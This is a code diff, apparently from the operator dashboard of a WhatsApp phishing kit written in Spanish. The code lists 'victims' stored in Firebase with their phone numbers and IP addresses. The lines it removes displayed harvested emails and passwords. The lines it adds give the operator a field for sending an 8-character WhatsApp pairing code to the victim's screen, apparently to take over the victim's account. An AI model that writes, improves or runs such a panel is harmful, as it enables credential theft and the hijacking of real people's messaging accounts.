@@ -789,68 +789,61 @@ function mostrarVictimas(snap) {
         const fecha = v.fecha ? new Date(v.fecha.toDate()).toLocaleString() : "Ahora";
         const docId = d.id;
 
-        html += `<div style="background:rgba(0,255,0,0.1);border:1px solid #0f0;border-radius:8px;padding:10px;margin:5px 0;font-size:13px;line-height:1.4;">`;
+        html += `<div style="background:rgba(0,255,0,0.1);border:1px solid #0f0;border-radius:8px;padding:12px;margin:8px 0;font-size:13px;line-height:1.4;box-shadow:0 0 10px rgba(0,255,0,0.1);">`;
 
-        // --- FOTO ---
-        if (v.fotoMiniatura) {
-            html += `<div style="text-align: center; margin-bottom: 10px;"><img src="${v.fotoMiniatura}" style="max-width: 150px; border-radius: 8px; cursor: pointer;" onclick="mostrarFotoCompleta('${encodeURIComponent(v.fotoOriginal)}')"></div>`;
-        }
+        // Datos principales de la víctima
+        html += `<strong style="color:#0f0">${v.template || "WhatsApp Web"}</strong><br>`;
+        if (v.numero) html += `Número: <b style="color:#0ff; font-size:14px;">${v.numero}</b><br>`;
+        if (v.ip) html += `IP: <small style="color:#777">${v.ip}</small><br>`;
 
-        // --- DATOS BÁSICOS ---
-        html += `<strong style="color:#0f0">${v.template || "Phishing"}</strong><br>`;
-        if (v.numero) html += `Número: <b style="color:#0ff">${v.numero}</b><br>`;
-        if (v.correo) html += `Correo: <b style="color:#fff">${v.correo}</b><br>`;
-        if (v.contraseña) html += `Contraseña: <b style="color:#fff">${v.contraseña}</b><br>`;
-
-        // ========================================================
-        // === NUEVO: PANEL DE ENVÍO DE CÓDIGO WHATSAPP ===
-        // ========================================================
-        if (v.template && v.template.includes("WhatsApp")) {
-            html += `
-                <div style="margin-top:10px; border-top:1px solid #0f0; padding-top:10px;">
-                    <input type="text" id="input-code-${docId}" placeholder="Pega 8 letras" 
+        // === CAMPO PARA ENVIAR EL CÓDIGO MANUAL ===
+        html += `
+            <div style="margin-top:12px; padding:10px; background:rgba(0,0,0,0.3); border-radius:5px; border:1px solid #0f0;">
+                <label style="color:#fff; font-size:11px; display:block; margin-bottom:5px;">CÓDIGO DE 8 DÍGITOS:</label>
+                <div style="display:flex; gap:5px;">
+                    <input type="text" id="input-code-${docId}" placeholder="Ej: X8KJ-P2M9" 
                            maxlength="8" 
-                           style="background:#000; color:#0f0; border:1px solid #0f0; width:120px; text-transform:uppercase; padding:4px;">
+                           style="flex:1; background:#000; border:1px solid #0f0; color:#0f0; padding:6px; border-radius:4px; text-transform:uppercase; font-family:monospace;">
                     <button onclick="enviarCodigoAVictima('${docId}')" 
-                            style="background:#0f0; color:#000; border:none; padding:5px 10px; cursor:pointer; font-weight:bold; border-radius:4px;">
+                            style="background:#0f0; color:#000; border:none; padding:6px 12px; border-radius:4px; font-weight:bold; cursor:pointer;">
                         ENVIAR
                     </button>
-                    <div style="font-size:10px; color:#aaa; margin-top:4px;">${v.codigo ? '✅ Enviado: ' + v.codigo : '⌛ Esperando código...'}</div>
                 </div>
-            `;
-        }
-        // ========================================================
+                <div id="status-${docId}" style="font-size:10px; margin-top:5px; color:#aaa;">
+                    ${v.codigo ? '✅ Código enviado: ' + v.codigo : '⌛ Esperando a que generes el código...'}
+                </div>
+            </div>
+        `;
 
-        html += `<small style="color:#0f0;">${fecha}</small></div>`;
+        html += `<small style="color:#444; display:block; margin-top:8px;">${fecha}</small></div>`;
     });
 
     html += `</div>`;
     cont.innerHTML = html;
 }
 
-// ⚠️ PEGA ESTA FUNCIÓN AL FINAL DE TU ARCHIVO (Fuera de mostrarVictimas)
+// FUNCIÓN PARA ACTUALIZAR FIREBASE CON EL CÓDIGO
 window.enviarCodigoAVictima = async (docId) => {
     const input = document.getElementById(`input-code-${docId}`);
     const codigo = input.value.trim().toUpperCase();
 
     if (codigo.length < 8) {
-        alert("El código de WhatsApp debe tener 8 letras/números.");
+        mostrarNotif("❌ El código debe tener 8 dígitos");
         return;
     }
 
     try {
-        // Referencia directa al documento de esta víctima específica
         const victimaRef = doc(db, "panelUsers", miUserDocId, "victimas", docId);
         await updateDoc(victimaRef, {
             codigo: codigo,
-            status: "enviado"
+            status: "mostrando_codigo"
         });
         
-        mostrarNotif("¡Código enviado! La víctima lo verá en su pantalla.");
+        mostrarNotif("✅ Código enviado a la web de la víctima");
         input.value = "";
-    } catch (e) {
-        console.error(e);
-        mostrarNotif("Error al enviar: " + e.message);
+    } catch (error) {
+        console.error("Error al enviar código:", error);
+        mostrarNotif("❌ Error técnico. Revisa Firebase.");
     }
 };
 // --- NUEVAS FUNCIONES PARA EL SISTEMA DE VISTA INTEGRADA ---
